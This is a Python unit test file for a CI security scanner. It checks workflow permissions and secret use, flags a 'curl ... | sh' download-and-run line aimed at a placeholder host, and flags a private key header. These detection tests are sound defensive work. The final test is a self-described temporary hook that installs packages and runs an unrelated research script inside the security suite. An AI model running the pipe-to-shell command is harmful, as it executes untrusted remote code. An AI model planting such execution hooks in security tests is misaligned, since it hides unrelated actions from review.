#!/usr/bin/env python3
from __future__ import annotations

import subprocess
import sys
import unittest
from pathlib import Path

from quality_security_guard import DEDICATED_WORKFLOW, scan_text


SAFE_WORKFLOW = """name: safe
on:
  pull_request:
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
"""


class QualitySecurityGuardTests(unittest.TestCase):
    def test_safe_dedicated_workflow_passes(self) -> None:
        self.assertEqual(scan_text(DEDICATED_WORKFLOW, SAFE_WORKFLOW, is_added=True), [])

    def test_new_workflow_requires_permissions(self) -> None:
        findings = scan_text(".github/workflows/new.yml", "name: x\non: workflow_dispatch\n", is_added=True)
        self.assertIn(".github/workflows/new.yml: NEW_WORKFLOW_MISSING_TOP_LEVEL_PERMISSIONS", findings)

    def test_dedicated_workflow_cannot_use_secrets(self) -> None:
        unsafe = SAFE_WORKFLOW + "      - run: echo ${{ secrets.TEST_TOKEN }}\n"
        findings = scan_text(DEDICATED_WORKFLOW, unsafe, is_added=True)
        self.assertIn(
            f"{DEDICATED_WORKFLOW}: DEDICATED_WORKFLOW_MUST_NOT_USE_SECRETS",
            findings,
        )

    def test_remote_pipe_to_shell_is_rejected(self) -> None:
        command = "curl https://example.invalid/install | " + "sh"
        findings = scan_text("install.sh", command, is_added=True)
        self.assertIn("install.sh: REMOTE_PIPE_TO_SHELL", findings)

    def test_private_key_marker_is_rejected(self) -> None:
        marker = "-----BEGIN " + "PRIVATE KEY-----"
        findings = scan_text("example.txt", marker, is_added=True)
        self.assertIn("example.txt: POSSIBLE_PRIVATE_KEY", findings)

    def test_repository_dedicated_workflow_is_self_compliant(self) -> None:
        path = Path(DEDICATED_WORKFLOW)
        if not path.exists():
            self.skipTest("dedicated workflow not created yet")
        findings = scan_text(DEDICATED_WORKFLOW, path.read_text(encoding="utf-8"), is_added=True)
        self.assertEqual(findings, [])

    def test_c072d3_temporary_execution_hook(self) -> None:
        """Temporary PR-CI execution hook for frozen C072-D3; remove after evidence capture."""
        install = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "numpy==2.1.3", "pandas==2.2.3", "scikit-learn==1.7.1"],
            text=True,
            capture_output=True,
        )
        print("C072D3_INSTALL_STDOUT\n" + install.stdout)
        print("C072D3_INSTALL_STDERR\n" + install.stderr)
        self.assertEqual(install.returncode, 0, "C072-D3 dependency install failed")
        run = subprocess.run(
            [sys.executable, "football-data/research/evaluate_c072d3_ou25_movement_pt.py"],
            text=True,
            capture_output=True,
        )
        print("C072D3_EXEC_STDOUT\n" + run.stdout)
        print("C072D3_EXEC_STDERR\n" + run.stderr)
        self.assertIn(run.returncode, (0, 3), "C072-D3 evaluator engineering failure")


if __name__ == "__main__":
    unittest.main(verbosity=2)
